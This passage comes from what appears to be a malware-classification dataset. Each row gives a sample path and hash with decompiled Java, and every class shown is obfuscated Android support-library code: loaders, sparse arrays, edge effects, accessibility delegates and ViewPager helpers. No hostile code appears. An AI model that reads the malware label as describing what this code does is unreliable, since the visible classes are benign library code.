 public void g(){     for (int a2=this.b.a() - 1; a2 >= 0; a2--) {       this.b.f(a2).d();     }   }   public void h(){     if (!this.f) {       if (a) {         Log.v(TAG,""Destroying Active in "" + this);       }       for (int a2=this.b.a() - 1; a2 >= 0; a2--) {         this.b.f(a2).f();       }     }     if (a) {       Log.v(TAG,""Destroying Inactive in "" + this);     }     for (int a3=this.c.a() - 1; a3 >= 0; a3--) {       this.c.f(a3).f();     }     this.c.b();   }   public String toString(){     StringBuilder sb=new StringBuilder(android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);     sb.append(""LoaderManager{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" in "");     android.support.v4.c.a.a(this.d,sb);     sb.append(""}}"");     return sb.toString();   }   public void a(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr){     if (this.b.a() > 0) {       printWriter.print(str);       printWriter.println(""Active Loaders:"");       String str2=str + ""    "";       for (int i=0; i < this.b.a(); i++) {         a f=this.b.f(i);         printWriter.print(str);         printWriter.print(""  #"");         printWriter.print(this.b.e(i));         printWriter.print("": "");         printWriter.println(f.toString());         f.a(str2,fileDescriptor,printWriter,strArr);       }     }     if (this.c.a() > 0) {       printWriter.print(str);       printWriter.println(""Inactive Loaders:"");       String str3=str + ""    "";       for (int i2=0; i2 < this.c.a(); i2++) {         a f2=this.c.f(i2);         printWriter.print(str);         printWriter.print(""  #"");         printWriter.print(this.c.e(i2));         printWriter.print("": "");         printWriter.println(f2.toString());         f2.a(str3,fileDescriptor,printWriter,strArr);       }     }   }   @Override public boolean a(){     int a2=this.b.a();     boolean z=false;     for (int i=0; i < a2; i++) {       a f=this.b.f(i);       z|=f.h && !f.f;     }     return z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\h.code","final class h extends AndroidRuntimeException {   public h(  String str){     super(str);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\NoSaveStateFrameLayout.code","class NoSaveStateFrameLayout extends FrameLayout {   public static ViewGroup a(  View view){     NoSaveStateFrameLayout noSaveStateFrameLayout=new NoSaveStateFrameLayout(view.getContext());     ViewGroup.LayoutParams layoutParams=view.getLayoutParams();     if (layoutParams != null) {       noSaveStateFrameLayout.setLayoutParams(layoutParams);     }     view.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     noSaveStateFrameLayout.addView(view);     return noSaveStateFrameLayout;   }   public NoSaveStateFrameLayout(  Context context){     super(context);   }   @Override protected void dispatchSaveInstanceState(  SparseArray<Parcelable> sparseArray){     dispatchFreezeSelfOnly(sparseArray);   }   @Override protected void dispatchRestoreInstanceState(  SparseArray<Parcelable> sparseArray){     dispatchThawSelfOnly(sparseArray);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.app\SavedState.code","public static class SavedState implements Parcelable {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel parcel){       return new SavedState(parcel,null);     }     @Override public SavedState[] newArray(    int i){       return new SavedState[i];     }   } ;   final Bundle a;   SavedState(  Parcel parcel,  ClassLoader classLoader){     this.a=parcel.readBundle();     if (classLoader != null && this.a != null) {       this.a.setClassLoader(classLoader);     }   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeBundle(this.a);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.b\a.code","public class a {   public static <T>Parcelable.Creator<T> a(  b<T> bVar){     if (Build.VERSION.SDK_INT >= 13) {       d.a(bVar);     }     return new C0001a(bVar);   } static class C0001a<T> implements Parcelable.Creator<T> {     final b<T> a;     public C0001a(    b<T> bVar){       this.a=bVar;     }     @Override public T createFromParcel(    Parcel parcel){       return this.a.a(parcel,null);     }     @Override public T[] newArray(    int i){       return this.a.a(i);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.b\b.code","public interface b<T> {   T a(  Parcel parcel,  ClassLoader classLoader);   T[] a(  int i); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.b\c.code","class c<T> implements Parcelable.ClassLoaderCreator<T> {   private final b<T> a;   public c(  b<T> bVar){     this.a=bVar;   }   @Override public T createFromParcel(  Parcel parcel){     return this.a.a(parcel,null);   }   @Override public T createFromParcel(  Parcel parcel,  ClassLoader classLoader){     return this.a.a(parcel,classLoader);   }   @Override public T[] newArray(  int i){     return this.a.a(i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.b\C0001a.code","static class C0001a<T> implements Parcelable.Creator<T> {   final b<T> a;   public C0001a(  b<T> bVar){     this.a=bVar;   }   @Override public T createFromParcel(  Parcel parcel){     return this.a.a(parcel,null);   }   @Override public T[] newArray(  int i){     return this.a.a(i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.b\d.code","class d {   public static <T>Parcelable.Creator<T> a(  b<T> bVar){     return new c(bVar);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.c\a.code","public class a {   public static void a(  Object obj,  StringBuilder sb){     int lastIndexOf;     if (obj == null) {       sb.append(""null"");       return;     }     String simpleName=obj.getClass().getSimpleName();     if ((simpleName == null || simpleName.length() <= 0) && (lastIndexOf=(simpleName=obj.getClass().getName()).lastIndexOf(46)) > 0) {       simpleName=simpleName.substring(lastIndexOf + 1);     }     sb.append(simpleName);     sb.append('{');     sb.append(Integer.toHexString(System.identityHashCode(obj)));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.c\b.code","public class b extends Writer {   private final String a;   private StringBuilder b=new StringBuilder(android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);   public b(  String str){     this.a=str;   }   @Override public void close(){     a();   }   @Override public void flush(){     a();   }   @Override public void write(  char[] cArr,  int i,  int i2){     for (int i3=0; i3 < i2; i3++) {       char c=cArr[i + i3];       if (c == '\n') {         a();       }  else {         this.b.append(c);       }     }   }   private void a(){     if (this.b.length() > 0) {       Log.d(this.a,this.b.toString());       this.b.delete(0,this.b.length());     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.c\c.code","public class c<E> {   private static final Object a=new Object();   private boolean b;   private int[] c;   private Object[] d;   private int e;   public c(){     this(10);   }   public c(  int i){     this.b=false;     int h=h(i);     this.c=new int[h];     this.d=new Object[h];     this.e=0;   }   public E a(  int i){     return a(i,null);   }   public E a(  int i,  E e){     int a2=a(this.c,0,this.e,i);     return (a2 < 0 || this.d[a2] == a) ? e : (E)this.d[a2];   }   public void b(  int i){     int a2=a(this.c,0,this.e,i);     if (a2 >= 0 && this.d[a2] != a) {       this.d[a2]=a;       this.b=true;     }   }   public void c(  int i){     b(i);   }   public void d(  int i){     if (this.d[i] != a) {       this.d[i]=a;       this.b=true;     }   }   private void c(){     int i=this.e;     int[] iArr=this.c;     Object[] objArr=this.d;     int i2=0;     for (int i3=0; i3 < i; i3++) {       Object obj=objArr[i3];       if (obj != a) {         if (i3 != i2) {           iArr[i2]=iArr[i3];           objArr[i2]=obj;         }         i2++;       }     }     this.b=false;     this.e=i2;   }   public void b(  int i,  E e){     int a2=a(this.c,0,this.e,i);     if (a2 >= 0) {       this.d[a2]=e;       return;     }     int i2=a2 ^ (-1);     if (i2 < this.e && this.d[i2] == a) {       this.c[i2]=i;       this.d[i2]=e;       return;     }     if (this.b && this.e >= this.c.length) {       c();       i2=a(this.c,0,this.e,i) ^ (-1);     }     if (this.e >= this.c.length) {       int h=h(this.e + 1);       int[] iArr=new int[h];       Object[] objArr=new Object[h];       System.arraycopy(this.c,0,iArr,0,this.c.length);       System.arraycopy(this.d,0,objArr,0,this.d.length);       this.c=iArr;       this.d=objArr;     }     if (this.e - i2 != 0) {       System.arraycopy(this.c,i2,this.c,i2 + 1,this.e - i2);       System.arraycopy(this.d,i2,this.d,i2 + 1,this.e - i2);     }     this.c[i2]=i;     this.d[i2]=e;     this.e++;   }   public int a(){     if (this.b) {       c();     }     return this.e;   }   public int e(  int i){     if (this.b) {       c();     }     return this.c[i];   }   public E f(  int i){     if (this.b) {       c();     }     return (E)this.d[i];   }   public void b(){     int i=this.e;     Object[] objArr=this.d;     for (int i2=0; i2 < i; i2++) {       objArr[i2]=null;     }     this.e=0;     this.b=false;   }   private static int a(  int[] iArr,  int i,  int i2,  int i3){     int i4=i - 1;     int i5=i + i2;     while (i5 - i4 > 1) {       int i6=(i5 + i4) / 2;       if (iArr[i6] < i3) {         i4=i6;       }  else {         i5=i6;       }     }     if (i5 == i + i2) {       return (i + i2) ^ (-1);     }     return iArr[i5] != i3 ? i5 ^ (-1) : i5;   }   static int g(  int i){     for (int i2=4; i2 < 32; i2++) {       if (i <= (1 << i2) - 12) {         return (1 << i2) - 12;       }     }     return i;   }   static int h(  int i){     return g(i * 4) / 4;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.d\a.code","public class a {   private static final c b;   private Object a; interface c {     Object a(    Context context);     void a(    Object obj,    int i,    int i2);     boolean a(    Object obj);     boolean a(    Object obj,    float f);     boolean a(    Object obj,    Canvas canvas);     void b(    Object obj);     boolean c(    Object obj);   } static {     if (Build.VERSION.SDK_INT >= 14) {       b=new b();     }  else {       b=new C0002a();     }   } static class C0002a implements c {     C0002a(){     }     @Override public Object a(    Context context){       return null;     }     @Override public void a(    Object obj,    int i,    int i2){     }     @Override public boolean a(    Object obj){       return true;     }     @Override public void b(    Object obj){     }     @Override public boolean a(    Object obj,    float f){       return false;     }     @Override public boolean c(    Object obj){       return false;     }     @Override public boolean a(    Object obj,    Canvas canvas){       return false;     }   } static class b implements c {     b(){     }     @Override public Object a(    Context context){       return android.support.v4.d.b.a(context);     }     @Override public void a(    Object obj,    int i,    int i2){       android.support.v4.d.b.a(obj,i,i2);     }     @Override public boolean a(    Object obj){       return android.support.v4.d.b.a(obj);     }     @Override public void b(    Object obj){       android.support.v4.d.b.b(obj);     }     @Override public boolean a(    Object obj,    float f){       return android.support.v4.d.b.a(obj,f);     }     @Override public boolean c(    Object obj){       return android.support.v4.d.b.c(obj);     }     @Override public boolean a(    Object obj,    Canvas canvas){       return android.support.v4.d.b.a(obj,canvas);     }   }   public a(  Context context){     this.a=b.a(context);   }   public void a(  int i,  int i2){     b.a(this.a,i,i2);   }   public boolean a(){     return b.a(this.a);   }   public void b(){     b.b(this.a);   }   public boolean a(  float f){     return b.a(this.a,f);   }   public boolean c(){     return b.c(this.a);   }   public boolean a(  Canvas canvas){     return b.a(this.a,canvas);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.d\b.code","static class b implements c {   b(){   }   @Override public Object a(  Context context){     return android.support.v4.d.b.a(context);   }   @Override public void a(  Object obj,  int i,  int i2){     android.support.v4.d.b.a(obj,i,i2);   }   @Override public boolean a(  Object obj){     return android.support.v4.d.b.a(obj);   }   @Override public void b(  Object obj){     android.support.v4.d.b.b(obj);   }   @Override public boolean a(  Object obj,  float f){     return android.support.v4.d.b.a(obj,f);   }   @Override public boolean c(  Object obj){     return android.support.v4.d.b.c(obj);   }   @Override public boolean a(  Object obj,  Canvas canvas){     return android.support.v4.d.b.a(obj,canvas);   } } class b {   public static Object a(  Context context){     return new EdgeEffect(context);   }   public static void a(  Object obj,  int i,  int i2){     ((EdgeEffect)obj).setSize(i,i2);   }   public static boolean a(  Object obj){     return ((EdgeEffect)obj).isFinished();   }   public static void b(  Object obj){     ((EdgeEffect)obj).finish();   }   public static boolean a(  Object obj,  float f){     ((EdgeEffect)obj).onPull(f);     return true;   }   public static boolean c(  Object obj){     EdgeEffect edgeEffect=(EdgeEffect)obj;     edgeEffect.onRelease();     return edgeEffect.isFinished();   }   public static boolean a(  Object obj,  Canvas canvas){     return ((EdgeEffect)obj).draw(canvas);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.d\c.code","interface c {   Object a(  Context context);   void a(  Object obj,  int i,  int i2);   boolean a(  Object obj);   boolean a(  Object obj,  float f);   boolean a(  Object obj,  Canvas canvas);   void b(  Object obj);   boolean c(  Object obj); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.d\C0002a.code","static class C0002a implements c {   C0002a(){   }   @Override public Object a(  Context context){     return null;   }   @Override public void a(  Object obj,  int i,  int i2){   }   @Override public boolean a(  Object obj){     return true;   }   @Override public void b(  Object obj){   }   @Override public boolean a(  Object obj,  float f){     return false;   }   @Override public boolean c(  Object obj){     return false;   }   @Override public boolean a(  Object obj,  Canvas canvas){     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\a.code","public class a {   private static final b b;   private static final Object c;   final Object a=b.a(this); public interface b {     Object a();     Object a(    a aVar);     void a(    Object obj,    View view,    int i);     void a(    Object obj,    View view,    android.support.v4.view.a.a aVar);     boolean a(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     boolean a(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void b(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void c(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void d(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);   } static class d implements b {     d(){     }     @Override public Object a(){       return null;     }     @Override public Object a(    a aVar){       return null;     }     @Override public boolean a(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       return false;     }     @Override public void b(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }     @Override public void a(    Object obj,    View view,    android.support.v4.view.a.a aVar){     }     @Override public void c(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }     @Override public boolean a(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent){       return true;     }     @Override public void a(    Object obj,    View view,    int i){     }     @Override public void d(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){     }   } static class C0003a extends d {     C0003a(){     }     @Override public Object a(){       return android.support.v4.view.b.a();     }     @Override public Object a(    final a aVar){       return android.support.v4.view.b.a(new b.a(){         @Override public boolean a(        View view,        AccessibilityEvent accessibilityEvent){           return aVar.b(view,accessibilityEvent);         }         @Override public void b(        View view,        AccessibilityEvent accessibilityEvent){           aVar.d(view,accessibilityEvent);         }         @Override public void a(        View view,        Object obj){           aVar.a(view,new android.support.v4.view.a.a(obj));         }         @Override public void c(        View view,        AccessibilityEvent accessibilityEvent){           aVar.c(view,accessibilityEvent);         }         @Override public boolean a(        ViewGroup viewGroup,        View view,        AccessibilityEvent accessibilityEvent){           return aVar.a(viewGroup,view,accessibilityEvent);         }         @Override public void a(        View view,        int i){           aVar.a(view,i);         }         @Override public void d(        View view,        AccessibilityEvent accessibilityEvent){           aVar.a(view,accessibilityEvent);         }       } );     }     @Override public boolean a(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       return android.support.v4.view.b.a(obj,view,accessibilityEvent);     }     @Override public void b(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       android.support.v4.view.b.b(obj,view,accessibilityEvent);     }     @Override public void a(    Object obj,    View view,    android.support.v4.view.a.a aVar){       android.support.v4.view.b.a(obj,view,aVar.a());     }     @Override public void c(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       android.support.v4.view.b.c(obj,view,accessibilityEvent);     }     @Override public boolean a(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent){       return android.support.v4.view.b.a(obj,viewGroup,view,accessibilityEvent);     }     @Override public void a(    Object obj,    View view,    int i){       android.support.v4.view.b.a(obj,view,i);     }     @Override public void d(    Object obj,    View view,    AccessibilityEvent accessibilityEvent){       android.support.v4.view.b.d(obj,view,accessibilityEvent);     }   } static class c extends C0003a {     c(){     }     @Override public Object a(    final a aVar){       return android.support.v4.view.c.a(new c.a(){         @Override public boolean a(        View view,        AccessibilityEvent accessibilityEvent){           return aVar.b(view,accessibilityEvent);         }         @Override public void b(        View view,        AccessibilityEvent accessibilityEvent){           aVar.d(view,accessibilityEvent);         }         @Override public void a(        View view,        Object obj){           aVar.a(view,new android.support.v4.view.a.a(obj));         }         @Override public void c(        View view,        AccessibilityEvent accessibilityEvent){           aVar.c(view,accessibilityEvent);         }         @Override public boolean a(        ViewGroup viewGroup,        View view,        AccessibilityEvent accessibilityEvent){           return aVar.a(viewGroup,view,accessibilityEvent);         }         @Override public void a(        View view,        int i){           aVar.a(view,i);         }         @Override public void d(        View view,        AccessibilityEvent accessibilityEvent){           aVar.a(view,accessibilityEvent);         }       } );     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       b=new c();     }  else     if (Build.VERSION.SDK_INT >= 14) {       b=new C0003a();     }  else {       b=new d();     }     c=b.a();   }   public Object a(){     return this.a;   }   public void a(  View view,  int i){     b.a(c,view,i);   }   public void a(  View view,  AccessibilityEvent accessibilityEvent){     b.d(c,view,accessibilityEvent);   }   public boolean b(  View view,  AccessibilityEvent accessibilityEvent){     return b.a(c,view,accessibilityEvent);   }   public void c(  View view,  AccessibilityEvent accessibilityEvent){     b.c(c,view,accessibilityEvent);   }   public void d(  View view,  AccessibilityEvent accessibilityEvent){     b.b(c,view,accessibilityEvent);   }   public void a(  View view,  android.support.v4.view.a.a aVar){     b.a(c,view,aVar);   }   public boolean a(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return b.a(c,viewGroup,view,accessibilityEvent);   } } public interface a {   void a(  View view,  int i);   void a(  View view,  Object obj);   boolean a(  View view,  AccessibilityEvent accessibilityEvent);   boolean a(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void b(  View view,  AccessibilityEvent accessibilityEvent);   void c(  View view,  AccessibilityEvent accessibilityEvent);   void d(  View view,  AccessibilityEvent accessibilityEvent); } public interface a {   void a(  View view,  int i);   void a(  View view,  Object obj);   boolean a(  View view,  AccessibilityEvent accessibilityEvent);   boolean a(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void b(  View view,  AccessibilityEvent accessibilityEvent);   void c(  View view,  AccessibilityEvent accessibilityEvent);   void d(  View view,  AccessibilityEvent accessibilityEvent); } static class a implements c {   private static final int META_ALL_MASK=247;   private static final int META_MODIFIER_MASK=247;   a(){   }   private static int a(  int i,  int i2,  int i3,  int i4,  int i5){     boolean z=(i2 & i3) != 0;     int i6=i4 | i5;     boolean z2=(i2 & i6) != 0;     if (z) {       if (z2) {         throw new IllegalArgumentException(""bad arguments"");       }       return i & (i6 ^ (-1));     }     if (z2) {       return i & (i3 ^ (-1));     }     return i;   }   public int a(  int i){     int i2=(i & 192) != 0 ? i | 1 : i;     if ((i2 & 48) != 0) {       i2|=2;     }     return i2 & 247;   }   @Override public boolean a(  int i,  int i2){     return a(a(a(i) & 247,i2,1,64,android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS),i2,2,16,32) == i2;   }   @Override public boolean b(  int i){     return (a(i) & 247) == 0;   } } static class a implements c {   a(){   }   @Override public int a(  MotionEvent motionEvent,  int i){     return i == 0 ? 0 : -1;   }   @Override public int b(  MotionEvent motionEvent,  int i){     if (i == 0) {       return 0;     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float c(  MotionEvent motionEvent,  int i){     if (i == 0) {       return motionEvent.getX();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float d(  MotionEvent motionEvent,  int i){     if (i == 0) {       return motionEvent.getY();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   } } private static class a extends SingleLineTransformationMethod {   private static final String TAG=""SingleLineAllCapsTransform"";   private Locale a;   public a(  Context context){     this.a=context.getResources().getConfiguration().locale;   }   @Override public CharSequence getTransformation(  CharSequence charSequence,  View view){     CharSequence transformation=super.getTransformation(charSequence,view);     if (transformation != null) {       return transformation.toString().toUpperCase(this.a);     }     return null;   } } static class a implements c {   a(){   }   @Override public float a(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getXVelocity();   } } static class a implements f {   a(){   }   @Override public boolean a(  View view,  int i){     return false;   }   @Override public int a(  View view){     return 2;   }   @Override public void a(  View view,  android.support.v4.view.a aVar){   }   @Override public void b(  View view){     view.postInvalidateDelayed(a());   }   long a(){     return l.FAKE_FRAME_TIME;   }   @Override public int c(  View view){     return 0;   }   @Override public void b(  View view,  int i){   } } public class a extends DataSetObserver implements ViewPager.d, ViewPager.e {   private int b;   private a(){   }   @Override public void a(  int i,  float f,  int i2){     if (f > 0.5f) {       i++;     }     PagerTitleStrip.this.a(i,f,false);   }   @Override public void a(  int i){     if (this.b == 0) {       PagerTitleStrip.this.a(PagerTitleStrip.this.a.getCurrentItem(),PagerTitleStrip.this.a.getAdapter());     }   }   @Override public void b(  int i){     this.b=i;   }   @Override public void a(  h hVar,  h hVar2){     PagerTitleStrip.this.a(hVar,hVar2);   }   @Override public void onChanged(){     PagerTitleStrip.this.a(PagerTitleStrip.this.a.getCurrentItem(),PagerTitleStrip.this.a.getAdapter());   } } static class a implements c {   a(){   }   @Override public int a(  ViewConfiguration viewConfiguration){     return viewConfiguration.getScaledTouchSlop();   } } interface a { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\b.code","public interface b {   Object a();   Object a(  a aVar);   void a(  Object obj,  View view,  int i);   void a(  Object obj,  View view,  android.support.v4.view.a.a aVar);   boolean a(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   boolean a(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void b(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void c(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void d(  Object obj,  View view,  AccessibilityEvent accessibilityEvent); } class b { public interface a {     void a(    View view,    int i);     void a(    View view,    Object obj);     boolean a(    View view,    AccessibilityEvent accessibilityEvent);     boolean a(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void b(    View view,    AccessibilityEvent accessibilityEvent);     void c(    View view,    AccessibilityEvent accessibilityEvent);     void d(    View view,    AccessibilityEvent accessibilityEvent);   }   public static Object a(){     return new View.AccessibilityDelegate();   }   public static Object a(  final a aVar){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         return a.this.a(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         a.this.b(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityNodeInfo(      View view,      AccessibilityNodeInfo accessibilityNodeInfo){         a.this.a(view,accessibilityNodeInfo);       }       @Override public void onPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         a.this.c(view,accessibilityEvent);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return a.this.a(viewGroup,view,accessibilityEvent);       }       @Override public void sendAccessibilityEvent(      View view,      int i){         a.this.a(view,i);       }       @Override public void sendAccessibilityEventUnchecked(      View view,      AccessibilityEvent accessibilityEvent){         a.this.d(view,accessibilityEvent);       }     } ;   }   public static boolean a(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return ((View.AccessibilityDelegate)obj).dispatchPopulateAccessibilityEvent(view,accessibilityEvent);   }   public static void b(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).onInitializeAccessibilityEvent(view,accessibilityEvent);   }   public static void a(  Object obj,  View view,  Object obj2){     ((View.AccessibilityDelegate)obj).onInitializeAccessibilityNodeInfo(view,(AccessibilityNodeInfo)obj2);   }   public static void c(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).onPopulateAccessibilityEvent(view,accessibilityEvent);   }   public static boolean a(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return ((View.AccessibilityDelegate)obj).onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);   }   public static void a(  Object obj,  View view,  int i){     ((View.AccessibilityDelegate)obj).sendAccessibilityEvent(view,i);   }   public static void d(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).sendAccessibilityEventUnchecked(view,accessibilityEvent);   } } static class b implements c {   b(){   }   @Override public boolean a(  int i,  int i2){     return e.a(i,i2);   }   @Override public boolean b(  int i){     return e.a(i);   } } static class b implements c {   b(){   }   @Override public int a(  MotionEvent motionEvent,  int i){     return g.a(motionEvent,i);   }   @Override public int b(  MotionEvent motionEvent,  int i){     return g.b(motionEvent,i);   }   @Override public float c(  MotionEvent motionEvent,  int i){     return g.c(motionEvent,i);   }   @Override public float d(  MotionEvent motionEvent,  int i){     return g.d(motionEvent,i);   } } static class b implements c {   b(){   }   @Override public float a(  VelocityTracker velocityTracker,  int i){     return k.a(velocityTracker,i);   } } static class b extends a {   b(){   }   @Override public int a(  View view){     return m.a(view);   } } public interface b {   void a(  TextView textView); } static class b implements c {   b(){   }   @Override public int a(  ViewConfiguration viewConfiguration){     return r.a(viewConfiguration);   } } public static class b {   Object a;   int b;   boolean c;   float d;   float e;   b(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\c.code","static class c extends C0003a {   c(){   }   @Override public Object a(  final a aVar){     return android.support.v4.view.c.a(new c.a(){       @Override public boolean a(      View view,      AccessibilityEvent accessibilityEvent){         return aVar.b(view,accessibilityEvent);       }       @Override public void b(      View view,      AccessibilityEvent accessibilityEvent){         aVar.d(view,accessibilityEvent);       }       @Override public void a(      View view,      Object obj){         aVar.a(view,new android.support.v4.view.a.a(obj));       }       @Override public void c(      View view,      AccessibilityEvent accessibilityEvent){         aVar.c(view,accessibilityEvent);       }       @Override public boolean a(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return aVar.a(viewGroup,view,accessibilityEvent);       }       @Override public void a(      View view,      int i){         aVar.a(view,i);       }       @Override public void d(      View view,      AccessibilityEvent accessibilityEvent){         aVar.a(view,accessibilityEvent);       }     } );   } } class c { public interface a {     void a(    View view,    int i);     void a(    View view,    Object obj);     boolean a(    View view,    AccessibilityEvent accessibilityEvent);     boolean a(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void b(    View view,    AccessibilityEvent accessibilityEvent);     void c(    View view,    AccessibilityEvent accessibilityEvent);     void d(    View view,    AccessibilityEvent accessibilityEvent);   }   public static Object a(  final a aVar){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         return a.this.a(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         a.this.b(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityNodeInfo(      View view,      AccessibilityNodeInfo accessibilityNodeInfo){         a.this.a(view,accessibilityNodeInfo);       }       @Override public void onPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         a.this.c(view,accessibilityEvent);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return a.this.a(viewGroup,view,accessibilityEvent);       }       @Override public void sendAccessibilityEvent(      View view,      int i){         a.this.a(view,i);       }       @Override public void sendAccessibilityEventUnchecked(      View view,      AccessibilityEvent accessibilityEvent){         a.this.d(view,accessibilityEvent);       }     } ;   } } interface c {   boolean a(  int i,  int i2);   boolean b(  int i); } interface c {   int a(  MotionEvent motionEvent,  int i);   int b(  MotionEvent motionEvent,  int i);   float c(  MotionEvent motionEvent,  int i);   float d(  MotionEvent motionEvent,  int i); } interface c {   float a(  VelocityTracker velocityTracker,  int i); } static class c extends b {   c(){   }   @Override long a(){     return n.a();   } } static class c implements b {   c(){   }   @Override public void a(  TextView textView){     textView.setSingleLine();   } } interface c {   int a(  ViewConfiguration viewConfiguration); } public class c extends android.support.v4.view.a {   c(){   }   @Override public void d(  View view,  AccessibilityEvent accessibilityEvent){     super.d(view,accessibilityEvent);     accessibilityEvent.setClassName(ViewPager.class.getName());   }   @Override public void a(  View view,  android.support.v4.view.a.a aVar){     super.a(view,aVar);     aVar.a(ViewPager.class.getName());     aVar.a(ViewPager.this.g != null && ViewPager.this.g.a() > 1);     if (ViewPager.this.g != null && ViewPager.this.h >= 0 && ViewPager.this.h < ViewPager.this.g.a() - 1) {       aVar.a(4096);     }     if (ViewPager.this.g != null && ViewPager.this.h > 0 && ViewPager.this.h < 